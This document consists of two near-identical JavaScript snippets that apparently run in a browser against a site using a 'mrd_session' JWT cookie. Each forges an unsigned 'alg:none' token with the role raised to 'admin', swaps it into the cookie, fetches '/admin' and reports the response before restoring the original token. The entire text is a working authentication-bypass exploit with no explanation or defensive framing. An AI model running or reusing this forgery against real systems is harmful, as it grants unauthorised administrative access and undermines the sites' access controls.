(async () => {
  const b64url = (obj) => btoa(JSON.stringify(obj)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
  const orig = document.cookie;
  const origMatch = orig.match(/mrd_session=([^;]+)/);
  const origToken = origMatch[1];
  const payloadB64 = origToken.split('.')[1];
  const payload = JSON.parse(atob(payloadB64.replace(/-/g,'+').replace(/_/g,'/')));
  const forgedHeader = b64url({alg:"none", typ:"JWT"});
  const forgedPayload = b64url({...payload, role:"admin"});
  const forgedToken = `${forgedHeader}.${forgedPayload}.`;
  document.cookie = `mrd_session=${forgedToken}; path=/`;
  let result;
  try {
    const resp = await fetch('/admin', {credentials:'same-origin'});
    const body = await resp.text();
    result = {status: resp.status, body: body.slice(0,500)};
  } finally {
    document.cookie = `mrd_session=${origToken}; path=/`;
  }
  return JSON.stringify({forgedPayload: JSON.parse(atob(forgedPayload.replace(/-/g,'+').replace(/_/g,'/'))), result});
})()

(async () => {
  const b64url = (obj) => btoa(JSON.stringify(obj)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
  const orig = document.cookie;
  const origToken = orig.match(/mrd_session=([^;]+)/)[1];
  const payload = JSON.parse(atob(origToken.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));
  const forgedToken = `${b64url({alg:"none", typ:"JWT"})}.${b64url({...payload, role:"admin"})}.`;
  document.cookie = `mrd_session=${forgedToken}; path=/`;
  let result;
  try {
    const resp = await fetch('/admin', {credentials:'same-origin'});
    result = {status: resp.status, body: (await resp.text()).slice(0,200)};
  } finally {
    document.cookie = `mrd_session=${origToken}; path=/`;
  }
  return JSON.stringify(result);
})()

